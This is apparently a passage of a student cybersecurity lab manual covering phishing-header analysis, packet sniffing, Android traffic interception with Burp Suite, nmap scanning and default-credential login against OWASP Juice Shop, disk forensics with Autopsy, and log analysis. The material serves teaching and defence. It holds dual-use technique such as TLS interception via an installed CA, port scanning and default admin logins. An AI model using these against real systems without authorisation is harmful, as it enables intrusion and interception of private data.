### Step 5 — Open VirusTotal

1. In the browser, go to:
   ```
   https://www.virustotal.com
   ```
2. The VirusTotal website loads.

### Step 6 — Search the Sender IP

1. Click on the **"Search"** tab at the top of the page (or look for a search field).
2. Type the sender IP address:
   ```
   94.100.31.27
   ```
3. Press **Enter** or click the search icon.
4. VirusTotal shows the reputation results for that IP.

### Step 7 — Read the VirusTotal Results

| Field | Result |
|-------|--------|
| Detection Ratio | **1 / 93** (1 vendor flagged as malicious out of 93) |
| IP Location | Netherlands |
| ASN | AS29802 (HVC-AS) |
| Status | Suspicious reputation (not widely blacklisted, but flagged) |

**Interpretation:** 1/93 vendors flagging the IP means it is not a widely known malicious IP, but its suspicious behaviour (SPF failure, foreign domain, unusual email content) together with the partial flag classifies it as high-risk.

---

## PART C — Identify Suspicious URLs in the Email

### Step 8 — Extract URLs from EML Analyzer

Go back to the EML Analyzer results and look for any URLs found in the email body.

**Suspicious URL Found:**
```
https://servervirto.com.co/ed/trn/update?email=brad@malware-traffic-analysis.net
```

**Why this URL is suspicious:**

| Indicator | Explanation |
|-----------|------------|
| Domain mismatch | Sender claims to be from `malware-traffic-analysis.net` but URL uses `servervirto.com.co` |
| Foreign domain | `.com.co` is a less-common TLD, often used in phishing |
| Credential harvesting | URL contains the victim's email address and asks for "update" — classic phishing pattern |
| No relation | The URL domain has no connection to the supposed sender |

---

## PART D — Answers to Lab Questions

| Question | Answer |
|----------|--------|
| 1. Full sender email address? | sues@nnwifi.com |
| 2. Domain used to send the email? | nnwifi.com |
| 3. Sender's IP address? | 94.100.31.27 |
| 4. Is the IP blacklisted? | Partially — 1/93 vendors flagged it |
| 5. SPF result? | FAIL |
| 6. One suspicious URL? | https://servervirto.com.co/ed/trn/update?email=brad@malware-traffic-analysis.net |

---

## Phishing Indicators Summary

| Indicator | Present in This Email |
|-----------|----------------------|
| Urgent subject line | ✅ "Warning: Final Notice" |
| Fake display name | ✅ Claims to be malware-traffic-analysis.net |
| Mismatched sender domain | ✅ Actually nnwifi.com |
| SPF authentication failure | ✅ Failed |
| Missing Message-ID | ✅ Missing |
| HTML-only email | ✅ text/html only |
| Suspicious external link | ✅ servervirto.com.co |
| IP partially flagged | ✅ 1/93 on VirusTotal |

## Conclusion

**This email is classified as PHISHING.** Multiple technical indicators confirm malicious intent including authentication failures, domain mismatch, suspicious URLs, and partial IP blacklisting.

---

---

# Experiment 7: Packet Sniffing and Network Traffic Analysis

**Aim:** To capture live network packets using tcpdump and analyze them using Wireshark to understand what information is visible in unencrypted HTTP traffic.

**Platform:** Kali Linux (in VirtualBox) | **Tools:** tcpdump, Wireshark, Python HTTP Server

---

## 🔷 How to Open Kali Linux in VirtualBox

1. Double-click the **VirtualBox** icon on the Windows desktop.
2. In VirtualBox Manager, you will see **"kali-linux"** listed on the left.
3. Click on it once to select it.
4. Click the green **"Start"** button at the top.
5. A new window opens — Kali Linux boots.
6. At the login screen: type username `kali`, press **Tab**, type password `kali`, press **Enter**.
7. The Kali Linux desktop appears.

---

## Step 1 — Open the First Terminal Window

1. **Right-click** anywhere on the Kali desktop.
2. Click **"Open Terminal Here"**.
3. A black terminal window opens.
4. You will use this window to run the HTTP server.

## Step 2 — Start a Local HTTP Server on Port 8080

1. In Terminal 1, type and press **Enter**:
   ```
   python3 -m http.server 8080
   ```
2. The terminal shows:
   ```
   Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
   ```
3. ✅ Your local HTTP server is now running on port 8080.
4. **Do NOT close this terminal** — keep it running in the background.

## Step 3 — Open a Second Terminal Window

1. **Right-click** on the Kali desktop again.
2. Click **"Open Terminal Here"** to open a **second** terminal window.
3. You now have two terminal windows open side by side.
4. Use this second terminal for the next step.

## Step 4 — Start Packet Capture with tcpdump

1. In **Terminal 2**, type and press **Enter**:
   ```
   sudo tcpdump -i any -w capture.pcap port 8080
   ```
   - `sudo` — runs as administrator (type password `kali` if asked)
   - `-i any` — listen on all network interfaces
   - `-w capture.pcap` — save the captured packets to a file named `capture.pcap`
   - `port 8080` — only capture traffic on port 8080
2. The terminal shows messages like:
   ```
   tcpdump: listening on any, link-type LINUX_SLL2 ...
   ```
3. ✅ tcpdump is now listening and saving packets. **Do NOT close this terminal.**

## Step 5 — Generate HTTP Traffic Using Firefox

1. Open **Firefox** browser in Kali Linux:
   - Click the Firefox icon in the taskbar at the bottom of the screen.
2. In the address bar, type and press **Enter**:
   ```
   http://localhost:8080
   ```
3. The browser loads a **directory listing page** showing files in the current folder.
4. Click on different files and folders.
5. **Refresh the page** 3–5 times by pressing **F5**.
6. This generates HTTP traffic that tcpdump is capturing.

## Step 6 — Stop Packet Capture

1. Switch back to **Terminal 2** (the tcpdump window).
2. Press `Ctrl + C` on your keyboard.
3. tcpdump stops and displays a summary:
   ```
   42 packets captured
   86 packets received by filter
   0 packets dropped by kernel
   ```
4. ✅ The packets have been saved to the file `capture.pcap`.

## Step 7 — Locate the Capture File

1. Click the **Kali dragon icon** (top-left of the screen) to open the applications menu.
2. Type **"File Manager"** and click it to open.
3. The **Home** folder opens.
4. You will see the file **`capture.pcap`** listed among other files. ✅

## Step 8 — Open the Capture File in Wireshark

1. **Double-click** on `capture.pcap` in the File Manager.
2. Since Wireshark is pre-installed in Kali, the file opens automatically in Wireshark.
3. Wireshark opens showing a list of all captured packets in a table with columns:
   - **No.** — packet number
   - **Time** — timestamp
   - **Source** — where the packet came from
   - **Destination** — where it is going
   - **Protocol** — TCP, HTTP, etc.
   - **Length** — size of the packet
   - **Info** — brief description

## Step 9 — Filter to Show Only HTTP Requests

1. In Wireshark, look at the **filter bar** at the top (a long white box with the word "Apply a display filter...").
2. Click inside that filter bar.
3. Type:
   ```
   http.request.method == "GET"
   ```
4. Press **Enter**.
5. ✅ Only HTTP GET request packets are shown — these are the requests Firefox made to the server.

## Step 10 — Inspect a Packet in Detail

1. Click on any one of the filtered packets (click anywhere on a row).
2. The **bottom half of Wireshark** shows the packet details in two panels:
   - **Middle panel:** Expandable tree view of packet layers (Frame → Ethernet → IP → TCP → HTTP)
   - **Bottom panel:** Raw hex data

3. In the **middle panel**, click the arrow next to **"Hypertext Transfer Protocol"** to expand it.
4. You will see:
   - `GET / HTTP/1.1\r\n` — the request line
   - `Host: localhost:8080\r\n` — the website being accessed
   - `User-Agent: Mozilla/5.0 (X11; Linux x86_64) ... Firefox/140.0\r\n` — browser details including OS and version
   - `Accept-Language: en-US,en;q=0.5\r\n` — language setting
   - `Connection: keep-alive\r\n`
   - `Sec-Fetch-Site: none\r\n`

5. All of this information is **visible in plain text** because HTTP is unencrypted.

## Step 11 — Filter POST Requests (Login Data)

1. Change the filter to:
   ```
   http.request.method == "POST"
   ```
2. Press **Enter**.
3. If any POST packets exist, click on them.
4. In the expanded HTTP section, you can see **form data submitted** including usernames and passwords — completely in plain text.
5. This proves that anyone sniffing the network can read login credentials sent over HTTP.

---

## 📊 Wireshark Filters Quick Reference

| Filter | What it Shows |
|--------|--------------|
| `http` | All HTTP traffic |
| `http.request.method == "GET"` | HTTP GET requests only |
| `http.request.method == "POST"` | HTTP POST requests (login forms, data submission) |
| `tcp.port == 8080` | All traffic on port 8080 |
| `ip.addr == 127.0.0.1` | Traffic to/from localhost |
| `dns` | DNS queries (domain lookups) |
| `tls` | Encrypted HTTPS traffic |

---

## Conclusion

Packets were successfully captured using tcpdump and analyzed in Wireshark. Sensitive data including browser type, OS, language, and visited URLs are visible in plain text when HTTP is used. This demonstrates that **HTTPS is mandatory** to protect data — with HTTPS, all traffic is encrypted and unreadable even when captured.

---

---

# Experiment 8: Analyzing Android App Permissions and Mobile Traffic

**Aim:** Intercept and analyse Android app HTTP and HTTPS traffic using Android Emulator and Burp Suite.

**Platform:** Windows | **Tools:** Android Studio (with Emulator), Burp Suite, ADB

---

## 🔷 How to Open Android Studio

1. Click the **Start button** (Windows logo, bottom-left).
2. Type `Android Studio` and press **Enter**.
3. Android Studio welcome screen appears with options like "New Project", "Open", etc.

---

## Step 1 — Open AVD Manager (Virtual Device Manager)

1. On the Android Studio welcome screen, click **"Tools"** in the top menu bar.
2. Click **"Device Manager"** from the dropdown.
3. A panel opens on the right showing virtual devices.
4. You will see a device listed (e.g., `Pixel 9` or `Medium Phone API 36`).

---

## Step 2 — Start the Emulator from Command Prompt (with Burp Proxy)

1. Press `Windows key + R` → type `cmd` → press **Enter**.
2. A black Command Prompt window opens.
3. Type and press **Enter**:
   ```
   cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
   ```
4. See available virtual devices:
   ```
   emulator -list-avds
   ```
   Output example: `Pixel_9`
5. Start the emulator with Burp Suite proxy:
   ```
   emulator -avd Pixel_9 -http-proxy http://10.0.2.2:8080
   ```
6. Wait 2–3 minutes — a phone screen appears as a separate window.
7. Wait until the Android home screen fully loads (app icons visible). ✅

---

## Step 3 — Set Proxy Inside the Android Emulator

1. In the emulator, tap the **upward arrow** at the bottom to open all apps.
2. Find and click the **"Settings"** app (gear icon ⚙️).
3. Click **"Network & Internet"** → click **"Internet"**.
4. You see **"AndroidWifi"** — click the **gear icon** next to it.
5. Click the **pencil icon (✏️)** at the top-right.
6. Scroll down → click **"Advanced options"**.
7. Find **"Proxy"** (shows "None") → click it → select **"Manual"**.
8. In **"Proxy hostname"**: type `10.0.2.2`
9. In **"Proxy port"**: type `8080`
10. Click **"Save"**.

**If Save button doesn't respond — use ADB instead:**
1. Open a second Command Prompt:
   ```
   cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
   ```
2. Check emulator connected:
   ```
   adb devices
   ```
   Should show: `emulator-5554    device`
3. Set proxy via ADB:
   ```
   adb shell settings put global http_proxy 10.0.2.2:8080
   ```
4. Verify:
   ```
   adb shell settings get global http_proxy
   ```
   Should print: `10.0.2.2:8080`

---

## Step 4 — Open and Configure Burp Suite

1. Click **Start** → type `Burp Suite` → press **Enter**.
2. Click **"Temporary project"** → **"Next"**.
3. Click **"Use Burp defaults"** → **"Start Burp"**.
4. In Burp Suite: click **"Proxy"** tab → click **"Proxy settings"**.
5. Under **"Proxy Listeners"**, select the row `127.0.0.1:8080` → click **"Edit"**.
6. Under **"Bind to address"**, select **"All interfaces"** → click **"OK"** → close Settings.
7. Click the **"Intercept"** sub-tab → make sure it says **"Intercept is on"**.

---

## Step 5 — Test HTTP Traffic Capture

1. In the Android Emulator, open **Chrome** browser.
2. Go to: `http://example.com`
3. In Burp Suite → **Proxy** → **HTTP history** — you see captured HTTP requests. ✅

---

## Step 6 — Export Burp Suite CA Certificate (for HTTPS)

1. In Burp Suite: **Proxy** → **Proxy settings** → scroll to **"Import / Export CA certificate"**.
2. Select **"Certificate in DER format"** under Export → **"Next"**.
3. Click **"Select file"** → navigate to **Downloads** folder.
4. Filename: `burpcer.der` → **"Save"** → **"Next"** → **"Close"**.

---

## Step 7 — Send Certificate to Emulator and Install It

1. In the platform-tools Command Prompt:
   ```
   adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
   ```
   Output: `1 file pushed` ✅
2. In the **Emulator**: Settings → Security & privacy → More security & privacy → Encryption & credentials → Install a certificate → CA certificate → Install Anyway.
3. Navigate to Downloads → click **`burpcer.der`** → certificate installed. ✅

---

## Step 8 — Verify HTTPS Interception

1. In the emulator Chrome: go to `https://example.com`
2. Page loads without certificate error.
3. In Burp Suite → Proxy → HTTP history — HTTPS requests now appear too. ✅

---

## Result

Android application network traffic was successfully intercepted using Burp Suite. Both HTTP and HTTPS traffic is now visible, demonstrating how mobile apps can be analyzed for privacy and security issues.

---

---

# Experiment 9: Testing IoT Device Security

**Aim:** Identify open ports, running services, weak credentials, and unencrypted communication in a simulated IoT device (OWASP Juice Shop).

**Platform:** Windows + Kali Linux | **Tools:** Docker, Nmap, Firefox

---

## Step 1 — Deploy Juice Shop on Windows (Simulated IoT Device)

1. Open **Command Prompt** on Windows (`Win + R` → `cmd` → Enter).
2. Type and press **Enter**:
   ```
   docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
   ```
3. Wait for it to finish (a long ID string appears — success).
4. Open your web browser → go to: `http://localhost:8090`
5. The **OWASP Juice Shop** website loads. ✅

---

## Step 2 — Find Your Windows IP Address

1. In Command Prompt, type and press **Enter**:
   ```
   ipconfig
   ```
2. Find the **"IPv4 Address"** under "Wireless LAN adapter Wi-Fi".
3. Note it down (looks like `192.168.x.x`).

---

## Step 3 — Perform Network Scan from Kali Linux

1. Open **Kali Linux** (in VirtualBox) → open Terminal.
2. Type (replace the IP with your Windows IP):
   ```
   nmap -sV 192.168.0.148
   ```
3. Wait 1–2 minutes. Results show:

```
PORT     STATE    SERVICE   VERSION
135/tcp  filtered msrpc
139/tcp  filtered netbios-ssn
445/tcp  filtered microsoft-ds
8090/tcp open     http      Juice Shop
```

---

## Step 4 — Test Default / Weak Credentials

1. In browser on Windows: go to `http://localhost:8090`
2. Top-right corner: click **"Account"** → **"Login"**.
3. Email: `admin@juice-sh.op` | Password: `admin123`
4. Click **"Log in"**.
5. ✅ Green banner appears — login successful with default credentials!

---

## Step 5 — Analyse Unencrypted HTTP Communication

1. On the Juice Shop page, press **F12** to open Developer Tools.
2. Click the **"Network"** tab.
3. Browse products, click items — rows appear for each request.
4. Click any row — you see Request Headers and Response in plain text.
5. All communication is over plain **HTTP** — data is visible and unencrypted.

---

## 📊 Observations Summary

| Finding | Detail | Risk |
|---------|--------|------|
| Open Port | Port 8090 accessible over network | High |
| Service Fingerprint | Juice Shop version visible in scan | Medium |
| System Ports | Windows ports 135, 139, 445 visible | Medium |
| Default Credentials | admin login worked first try | Critical |
| No Encryption | HTTP only — plain text transmission | High |

## Result

IoT device simulation successfully demonstrated open port discovery, service fingerprinting, default credential exploitation, and unencrypted communication vulnerabilities.

---

---

# Experiment 10: Creating and Analyzing Disk Images with Autopsy

**Aim:** Create a forensic disk image using `dd` and analyze it using Autopsy in Kali Linux to simulate digital forensic investigation.

**Platform:** Kali Linux | **Tools:** dd, mkfs.ext4, mount, Autopsy

---

## 🔷 Opening Kali Linux Terminal

1. Open VirtualBox → Start Kali Linux.
2. Log in: username `kali`, password `kali`.
3. Press `Ctrl + Alt + T` to open Terminal.

---

## Step 1 — Create a 100MB Practice Disk Image

> We create a blank 100MB virtual disk to practice forensics on, instead of using the real system disk.

1. In the terminal, type and press **Enter**:
   ```
   dd if=/dev/zero of=/home/kali/practice_disk.dd bs=1M count=100
   ```
   - `if=/dev/zero` — reads from a source of blank (zeroed) data
   - `of=/home/kali/practice_disk.dd` — saves the output as a file
   - `bs=1M` — block size of 1 megabyte
   - `count=100` — create 100 blocks = 100 MB total
2. Wait for it to finish. Output:
   ```
   100+0 records in
   100+0 records out
   104857600 bytes (105 MB, 100 MiB) copied
   ```
   ✅ A 100MB blank disk image file is created.

---

## Step 2 — Format the Disk Image with a Filesystem

1. Type and press **Enter**:
   ```
   mkfs.ext4 /home/kali/practice_disk.dd
   ```
   - `mkfs.ext4` — formats the file with the ext4 Linux filesystem
2. A lot of text appears showing filesystem creation details.
3. Wait for the prompt to return. ✅

---

## Step 3 — Create a Mount Point Directory

1. Type and press **Enter**:
   ```
   mkdir /home/kali/mnt
   ```
   - This creates a folder called `mnt` — we will "attach" the disk image here.

---

## Step 4 — Mount the Disk Image

1. Type and press **Enter**:
   ```
   sudo mount -o loop /home/kali/practice_disk.dd /home/kali/mnt
   ```
   - `sudo` — run with administrator rights (type `kali` if asked for password)
   - `-o loop` — mount a file as if it were a physical disk
   - The disk image is now accessible as a folder at `/home/kali/mnt`

---

## Step 5 — Create Evidence Files Inside the Disk

> We add files to the virtual disk to simulate "digital evidence" that a forensic investigator would look for.

1. Type and press **Enter**:
   ```
   echo "check" | sudo tee /home/kali/mnt/evidence.txt
   ```
   - This creates a file called `evidence.txt` containing the word "check" inside the disk image.
2. Verify it was created — type and press **Enter**:
   ```
   cat /home/kali/mnt/evidence.txt
   ```
   Output: `check` ✅

---

## Step 6 — Unmount the Disk Image

1. Type and press **Enter**:
   ```
   sudo umount /home/kali/mnt
   ```
2. The disk image is now detached from the folder.
3. The file `practice_disk.dd` still exists with all the files inside it. ✅

---

## Step 7 — Install dc3dd (Enhanced Forensic Imaging Tool)

1. Type and press **Enter**:
   ```
   sudo apt install dc3dd
   ```
2. Type `kali` for password and press Enter.
3. When asked "Do you want to continue? [Y/n]" — type `Y` and press Enter.
4. Wait for installation to complete.

---

## Step 8 — Create a Forensic Image with Hash Verification (Optional Advanced Step)

1. First see what disks exist:
   ```
   lsblk
   ```
   Note the partition name (e.g., `sda1`).
2. Create a forensic image with dc3dd and record hash:
   ```
   sudo dc3dd if=/dev/sda1 of=/home/kali/disk_image.dd hash=md5 log=/home/kali/acquisition.log
   ```
   *(This may take a long time on a real disk — use the practice_disk.dd for lab purposes.)*
3. View the acquisition log:
   ```
   cat /home/kali/acquisition.log
   ```

---

## Step 9 — Open Autopsy (Forensic Browser)

1. In the terminal, type and press **Enter**:
   ```
   sudo autopsy
   ```
2. The terminal shows:
   ```
   Autopsy Forensic Browser
   Local Port: 9999
   Open an HTML browser and paste this URL:
       http://localhost:9999/autopsy
   ```
3. **Do NOT close this terminal** — keep it open.

---

## Step 10 — Open Autopsy in Firefox

1. Open **Firefox** in Kali Linux.
2. In the address bar, type:
   ```
   http://localhost:9999/autopsy
   ```
3. Press **Enter**.
4. The **Autopsy Forensic Browser** loads with buttons: **Open Case**, **New Case**, **Help**.

---

## Step 11 — Create a New Case

1. Click **"New Case"** button.
2. Fill in the form:
   - **Case Name:** `CyberForensicsLab`
   - **Description:** `Practice forensic disk image investigation`
   - **Investigator Names (field a):** type your own name
3. Click **"New Case"** button.
4. Next screen says case directory created and asks to add a host.
5. Select your name from the dropdown list.
6. Click **"Add Host"** button.

---

## Step 12 — Add Host Details

1. Fill in the **"Add a New Host"** form:
   - **Host Name:** `KaliLabMachine`
   - **Description:** `forensic disk image investigation`
   - Leave all other fields blank.
2. Click **"Add Host"** button.
3. Next screen shows an **"Add Image"** button — click it.

---

## Step 13 — Add the Disk Image to Autopsy

1. Fill in the **"Add a New Image"** form:
   - **Location:** `/home/kali/practice_disk.dd`
   - **Type:** click radio button for **"Partition"**
   - **Import Method:** click **"Symlink"**
2. Click **"Next"**.
3. On the Image File Details screen:
   - Under Data Integrity: select **"Calculate the hash value for this image"**
   - Check: **"Verify hash after importing"**
4. Click **"Add"**.
5. Autopsy calculates the MD5 hash — wait for it to finish.
6. Click **"OK"**. ✅

---

## Step 14 — Analyze Evidence in Autopsy

1. You are now in the main analysis screen with tabs: **File Analysis | Keyword Search | File Type | Image Details | Meta Data | Data Unit**

**Browse Files:**
- Click **"File Analysis"** tab.
- Directories appear — click folders to expand.
- Click any file to see its contents in the panel below.
- Look for `evidence.txt` — click it to see the contents ("check").

**Search for Keywords:**
- Click **"Keyword Search"** tab.
- In the text box, type `check` → click **"Search"**.
- Results show which files contain that word.

**View Deleted Files:**
- In File Analysis, files marked in **red** are deleted files.
- Click on them to recover/view their content.

**Sort by File Type:**
- Click **"File Type"** tab → click **"Sort Files by Type"** → click **"View Sorted Files"**.

---

## 📊 Forensic Commands Summary

| Command | Purpose |
|---------|---------|
| `dd if=/dev/zero of=disk.dd bs=1M count=100` | Create a blank 100MB disk image |
| `mkfs.ext4 disk.dd` | Format disk image with ext4 filesystem |
| `mkdir /mnt_point` | Create a folder to mount the disk |
| `sudo mount -o loop disk.dd /mnt_point` | Mount disk image as a folder |
| `echo "data" \| sudo tee /mnt_point/file.txt` | Create a file inside the mounted disk |
| `sudo umount /mnt_point` | Unmount the disk image |
| `sudo autopsy` | Launch the Autopsy forensic tool |

## Result

A forensic disk image was successfully created using `dd`, evidence files were planted, and the image was analyzed using Autopsy to browse files, search keywords, and view deleted files.

---

---

# Experiment 11: Log File Analysis for Incident Detection

**Aim:** Analyse system log files in Kali Linux to detect suspicious activities like failed login attempts and identify patterns that indicate attacks.

**Platform:** Kali Linux | **Tools:** journalctl, grep, awk, SSH

---

## 🔷 Opening Terminal in Kali Linux

Press `Ctrl + Alt + T` — black terminal window opens.

---

## Step 1 — Navigate to the Log Directory

1. Type and press **Enter**:
   ```
   cd /var/log
   ```
2. List files:
   ```
   ls
   ```
3. Log files you will see:
   | Log File/Folder | What it Contains |
   |----------------|-----------------|
   | `apache2/` | Web server access and error logs |
   | `journal/` | Main system logs |
   | `wtmp` | Successful login records |
   | `btmp` | Failed login records |
   | `dpkg.log` | Software installation history |

---

## Step 2 — View Successful Login History

1. Type and press **Enter**:
   ```
   last
   ```
2. A list shows:
   - **Who** logged in
   - **From where** (terminal name or IP address)
   - **When** they logged in and when they logged out
3. Look for unusual logins at odd hours or from unknown locations.

---

## Step 3 — View All System Logs

1. Type and press **Enter**:
   ```
   journalctl | less
   ```
2. Logs scroll on screen:
   - Press **Space** → next page
   - Press **b** → previous page
   - Press **q** → quit and return to terminal

---

## Step 4 — Search for Failed Login Attempts

1. Type and press **Enter**:
   ```
   journalctl | grep "Failed"
   ```
2. Only lines containing the word "Failed" are shown.
3. Multiple "Failed" entries from the same IP = suspected brute force.

---

## Step 5 — Search for SSH Activity

1. Type and press **Enter**:
   ```
   journalctl | grep ssh
   ```
2. All SSH-related entries appear — connections made, when they started, failures.

---

## Step 6 — Search for System Errors

1. Type and press **Enter**:
   ```
   journalctl | grep -i error
   ```
2. All error messages appear (case-insensitive search).

---

## Step 7 — Analyse Apache Web Server Logs

1. Navigate to Apache logs:
   ```
   cd /var/log/apache2
   ls
   ```
   You see: `access.log`, `error.log`
2. View the access log:
   ```
   sudo less access.log
   ```
   Each line shows: IP address, date/time, request, response code.
   Press **q** to quit.
3. Find all 404 errors (suspicious scanning):
   ```
   grep "404" /var/log/apache2/access.log
   ```

---

## Step 8 — View Software Installation Logs

1. Type and press **Enter**:
   ```
   less /var/log/dpkg.log
   ```
2. Shows all software installed, removed, or updated.
3. Look for unexpected software installations at unusual times.
4. Press **q** to quit.

---

## Step 9 — Real-Time Log Monitoring

1. Type and press **Enter**:
   ```
   sudo journalctl -f
   ```
2. Logs appear in **real time** — new entries print automatically.
3. Open another action (like starting a service) — you will see the log appear instantly.
4. Press `Ctrl + C` to stop.

---

## Step 10 — Simulate Failed SSH Logins (Create Test Data)

**First, start SSH service:**
1. Type and press **Enter**:
   ```
   sudo service ssh start
   ```
2. Find your IP:
   ```
   ip a
   ```
   Note the IP under `eth0` (e.g., `10.0.2.15`).

**Generate failed login attempts (repeat 5–10 times):**
1. Type and press **Enter**:
   ```
   ssh fakeuser@localhost
   ```
2. When asked "Are you sure you want to continue connecting?" → type `yes` → Enter.
3. When asked for password → type `wrongpassword` → Enter.
4. It says "Permission denied" — this is one failed attempt logged.
5. Repeat steps 1–4 a total of **5 to 10 times**.
6. Press `Ctrl + C` when done.

---

## Step 11 — Analyze the Generated Failed Login Logs

1. Find all failed password entries:
   ```
   journalctl | grep "Failed password"
   ```
   You see lines like: `Failed password for fakeuser from 127.0.0.1 port ...`

2. Extract just the IP addresses:
   ```
   journalctl | grep "Failed password" | awk '{print $11}'
   ```
   Output: `127.0.0.1` (repeated for each failure)

3. Count how many times each IP failed (detect brute force):
   ```
   journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
   ```
   Output:
   ```
   10  127.0.0.1
   ```
   This means `127.0.0.1` failed **10 times** — pattern of a **brute force attack**.

4. View logs from the last 10 minutes only:
   ```
   journalctl --since "10 minutes ago"
   ```

---

## 📊 Quick Reference — Suspicious Signs

| Check | Command | Suspicious If |
|-------|---------|--------------|
| Failed logins | `journalctl \| grep "Failed password"` | Many attempts from same IP |
| SSH activity | `journalctl \| grep ssh` | Unknown connections |
| Login history | `last` | Logins at odd hours |
| System errors | `journalctl \| grep -i error` | Repeated identical errors |
| Web requests | `grep "404" access.log` | Many failed page requests |
| Software | `less /var/log/dpkg.log` | Unknown software installed |

## Result

System logs were successfully analyzed to detect failed SSH login attempts, simulate brute force attack patterns, and identify suspicious IP addresses — key skills in incident detection and response.

---

---

# Experiment 12: Network Forensics with Wireshark

**Aim:** To capture and analyze network packets using Wireshark to perform network forensic analysis — including protocol analysis, traffic filtering, suspicious traffic detection, and statistics generation.

**Platform:** Kali Linux | **Tools:** Wireshark, nmap, tcpdump

---

## 🔷 Opening Kali Linux Terminal

1. Open VirtualBox → Start Kali Linux → Log in (kali/kali).
2. Right-click on desktop → **"Open Terminal Here"**.

---

## Step 1 — Open Wireshark

1. In the terminal, type and press **Enter**:
   ```
   wireshark &
   ```
   *(The `&` lets Wireshark open while keeping the terminal available.)*
2. Wireshark opens in a new window.
3. You see the **Welcome Screen** with a list of **network interfaces** (eth0, lo, docker0, etc.).
4. You can see tiny **bar charts / waveforms** moving next to interfaces that have active traffic.
5. Click on **"eth0"** (the main network interface with traffic activity).
6. Click the **blue shark fin button** (top-left, looks like 🦈) — this **starts capturing**.
7. Packets begin appearing in real time in the main list.

---

## Step 2 — Generate Some Network Traffic to Capture

> We need to create network traffic so Wireshark has something to analyze.

1. Open a **second terminal** (right-click desktop → Open Terminal Here).
2. In the second terminal, type and press **Enter**:
   ```
   ping -c 10 google.com
   ```
   *(This sends 10 ping requests to google.com — generates ICMP traffic.)*
3. Also type:
   ```
   curl http://example.com
   ```
   *(This makes an HTTP request — generates TCP and HTTP traffic.)*
4. Switch back to Wireshark — you will see packets flying in.

---

## Step 3 — Stop the Capture

1. In Wireshark, click the **red square button** (🔴 Stop) in the toolbar.
2. The capture stops. All captured packets remain visible.
3. Save the capture — go to **File** → **Save As** → name it `lab_capture.pcap` → click **Save**.

---

## Step 4 — Protocol Analysis (TCP / UDP / HTTP)

### View All Protocols

1. Look at the **Protocol** column in the packet list — you will see TCP, UDP, ICMP, HTTP, DNS, TLS, etc.
2. Click on a **TCP packet** (blue row) to select it.
3. In the **middle panel**, expand **"Transmission Control Protocol"** by clicking the arrow.
4. You see fields like:
   - Source Port / Destination Port
   - Sequence Number
   - Acknowledgement Number
   - Flags (SYN, ACK, FIN, RST)
   - Window Size

### Apply a HTTP Filter

1. In the **filter bar** at the top, type:
   ```
   http
   ```
2. Press **Enter**.
3. Only HTTP packets appear.
4. Click any HTTP GET packet → expand **"Hypertext Transfer Protocol"** in middle panel.
5. You see the full HTTP request in plain text — URL, Host, User-Agent.

### Apply a UDP Filter

1. In the filter bar, type:
   ```
   udp
   ```
2. Press **Enter** — only UDP packets appear.
3. DNS queries typically use UDP port 53.

---

## Step 5 — Applying Advanced Filters

Practice these filters one by one in the Wireshark filter bar:

| Filter | What It Shows |
|--------|--------------|
| `tcp` | All TCP traffic |
| `udp` | All UDP traffic |
| `http` | HTTP web traffic only |
| `dns` | DNS queries and responses |
| `icmp` | Ping traffic |
| `tls` | Encrypted HTTPS traffic |
| `ip.addr == 8.8.8.8` | Traffic to/from Google DNS |
| `tcp.port == 80` | HTTP traffic on port 80 |
| `tcp.port == 443` | HTTPS traffic |
| `http.request` | HTTP requests only |
| `http.response` | HTTP responses only |
| `frame.len > 1000` | Packets larger than 1000 bytes |

---

## Step 6 — Following a TCP Stream

1. Clear the filter bar (click inside it → press `Ctrl + A` → press `Delete` → press Enter).
2. Find any HTTP packet in the list.
3. **Right-click** on that packet.
4. From the right-click menu, hover over **"Follow"** → click **"TCP Stream"**.
5. A new window opens showing the **entire conversation** between client and server in a readable format:
   - **Red text** = data sent by the client (your machine)
   - **Blue text** = data sent by the server
6. You can read the full HTTP request and response including headers and body.
7. Close this window when done.

---

## Step 7 — Identifying Suspicious Traffic (Port Scan Detection)

### Run a Port Scan to Generate Suspicious Traffic

1. In a Kali **Terminal**, type and press **Enter**:
   ```
   nmap -sS 127.0.0.1
   ```
   *(This runs a SYN scan on localhost — generates suspicious scan traffic.)*
2. nmap scans the system and shows open ports.

### Detect the Scan in Wireshark

1. In the Wireshark filter bar, type:
   ```
   tcp.flags.syn == 1 && tcp.flags.ack == 0
   ```
2. Press **Enter**.
3. You will see many packets appearing rapidly to different port numbers — this is the **port scan traffic pattern**.
4. **Key observation:** Many SYN packets sent to consecutive ports from the same source IP = classic port scan signature.

| Normal Traffic | Port Scan Traffic |
|----------------|------------------|
| SYN to one specific port | SYN to many different ports rapidly |
| Full 3-way handshake (SYN, SYN-ACK, ACK) | Only SYN sent, no complete handshake |
| Few connections per second | Hundreds of connections per second |

---

## Step 8 — Statistics — Capture File Properties

1. In Wireshark, go to the top menu → click **"Statistics"**.
2. Click **"Capture File Properties"** from the dropdown.
3. A window shows:
   - **File name** and path
   - **Number of packets** captured
   - **Capture duration** (start time, stop time, elapsed time)
   - **Packet size** (minimum, maximum, average)
4. Note these values for your lab record.
5. Close the window.

---

## Step 9 — Statistics — Protocol Hierarchy

1. Go to top menu → **"Statistics"** → **"Protocol Hierarchy"**.
2. A window shows all protocols found in the capture with:
   - **Protocol name**
   - **% Packets** (what percentage of total traffic is this protocol)
   - **Packets** (total count)
   - **Bytes** (total data)
3. **What to look for:**
   - Is TCP dominant? Expected for web browsing.
   - Is there a lot of ICMP? May indicate ping sweep/scan.
   - Unexpected protocols could indicate unauthorized activity.
4. Close the window.

---

## Step 10 — Statistics — Conversations

1. Go to **"Statistics"** → **"Conversations"**.
2. A window shows separate tabs: **Ethernet | IPv4 | IPv6 | TCP | UDP**
3. Click the **"TCP"** tab.
4. You see all TCP connections with:
   - **Address A** ↔ **Address B** (source and destination IPs)
   - **Port A** and **Port B**
   - **Packets** and **Bytes** exchanged
5. **What to look for:**
   - A single IP communicating with hundreds of other IPs = suspicious (scanner/botnet).
   - Connections to unusual port numbers.
6. Close the window.

---

## Step 11 — Statistics — Endpoints

1. Go to **"Statistics"** → **"Endpoints"**.
2. Click the **"IPv4"** tab.
3. You see all IP addresses seen in the capture with packet counts.
4. **What to look for:**
   - Unknown external IP addresses.
